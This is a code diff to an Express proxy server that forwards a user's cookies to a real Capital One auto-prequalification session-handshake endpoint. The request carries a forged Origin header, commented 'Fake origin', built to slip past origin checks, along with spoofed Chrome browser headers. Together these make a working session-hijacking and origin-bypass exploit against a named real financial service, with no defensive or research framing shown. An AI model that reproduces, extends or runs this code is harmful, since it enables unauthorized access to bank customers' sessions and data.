@@ -9,29 +9,42 @@ app.use(express.json());
 
 // Proxy route to forward requests with modified Origin header and user cookies
 app.post('/proxy', (req, res) => {
-  const { targetUrl, userCookies } = req.body;  // Get target URL and user's cookies from frontend
-
+  const { userCookies } = req.body;  // Get user's cookies from frontend
+  
+  // Define target URL for session-handshake
+  const targetUrl = 'https://coaf-prequalification.capitalone.com/protected/476043/auto/application/session-handshake';
+  
   // Log the cookies received from the frontend
   console.log('Cookies received from frontend:', userCookies);
 
   // Define request options (headers, method, etc.)
   const requestOptions = {
-    method: 'GET',
+    method: 'POST',  // Change to POST for session-handshake request
     headers: {
       'Origin': 'https://chinamayjoshi.xyz?#xyz.capitalone.com',  // Fake origin
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',
-      'Accept': '*/*',  // Accept all content types
+      'Accept': 'application/json;v=1',  // Accept JSON format
+      'Content-Type': 'application/json',  // Define content type as JSON
       'Cookie': userCookies,  // Include user's cookies dynamically
       'Referer': 'https://coaf-prequalification.capitalone.com/',
       'Sec-Ch-Ua': '".Not/A)Brand";v="99", "Google Chrome";v="114", "Chromium";v="114"',
       'Sec-Ch-Ua-Platform': 'Windows',
       'Sec-Ch-Ua-Mobile': '?0',
     },
-    credentials: 'include'  // Include cookies if needed
+    credentials: 'include',  // Include cookies if needed
+    body: JSON.stringify({
+      abTestSchemas: [
+        {
+          abTestName: 'Universal Identity',
+          abTestVariation: 'a',
+          abTestVariationName: 'universal-identity-disabled'
+        }
+      ]
+    })  // Add body for the POST request
   };
 
   // Log the full request headers before sending
-  console.log('Sending request to Capital One:', targetUrl);
+  console.log('Sending POST request to Capital One:', targetUrl);
   console.log('Request Headers:', JSON.stringify(requestOptions.headers, null, 2));
 
   fetch(targetUrl, requestOptions)
